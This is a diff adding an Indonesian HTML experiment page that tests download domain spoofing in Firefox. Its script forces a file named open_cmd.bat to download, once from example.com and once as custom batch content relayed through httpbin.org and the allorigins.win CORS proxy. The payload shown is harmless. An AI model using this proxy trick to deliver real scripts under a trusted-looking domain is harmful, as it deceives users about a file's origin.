@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Domain Spoofing Test</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; }
+        button { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; }
+        .btn-example { background: #e63946; }
+        .btn-example2 { background: #f4a261; }
+        #log { background: #111; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 120px; overflow-y: auto; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <h2>🕵️ Eksperimen Domain Spoofing</h2>
+    <p style="font-size: 13px; color: #555;">Klik tombol di bawah dan lihat panel download Firefox Anda.</p>
+
+    <button class="btn-example" onclick="tryFetchExample()">1. Download dari Example.com (Domain Asli)</button>
+    <button class="btn-example2" onclick="tryCorsProxy()">2. Bypass via CORS Proxy (Custom Content)</button>
+
+    <pre id="log">Menunggu perintah...</pre>
+
+    <script>
+        function log(msg) {
+            const el = document.getElementById('log');
+            el.textContent += '\n> ' + msg;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        // KONTEN FILE BATCH BUATAN KITA
+        const BAT_TEXT = '@echo off\ntitle Hacked\necho Ini file palsu!\npause\n';
+
+        // ==========================================
+        // METODE 1: BENAR-BENAR DOWNLOAD DARI EXAMPLE.COM
+        // ==========================================
+        function tryFetchExample() {
+            log('Memicu download langsung dari example.com...');
+            
+            // Trik: Kita menunjuk langsung ke URL eksternal
+            const a = document.createElement('a');
+            a.href = 'https://example.com'; // URL Asli
+            a.download = 'open_cmd.bat';    // Nama file dipaksa jadi .bat
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            log('✅ Cek panel download!');
+            log('Domain akan berubah jadi "example.com".');
+            log('TAPI... isi file-nya adalah HTML dari example.com, bukan script BAT kita.');
+        }
+
+        // ==========================================
+        // METODE 2: TRICK CORS PROXY (CUSTOM CONTENT)
+        // ==========================================
+        function tryCorsProxy() {
+            log('Menyuntikkan konten via CORS Proxy...');
+            
+            // Kita gunakan proxy publik untuk mengambil file kita sendiri
+            // (Dalam hal ini, kita pakai endpoint yang mengembalikan teks custom)
+            // Biar aman, kita pakai httpbin.org yang mengembalikan teks apa pun.
+            
+            const targetUrl = 'https://httpbin.org/base64/' + btoa(BAT_TEXT);
+            
+            // Tembak via proxy agar tidak kena CORS block
+            const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(targetUrl);
+            
+            const a = document.createElement('a');
+            a.href = proxyUrl; 
+            a.download = 'open_cmd.bat'; 
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            log('✅ Cek panel download!');
+            log('Domain akan berubah jadi "allorigins.win" atau "httpbin.org".');
+            log('Isi file mungkin akan sesuai dengan BAT_TEXT kita.');
+        }
+    </script>
+</body>
+</html>
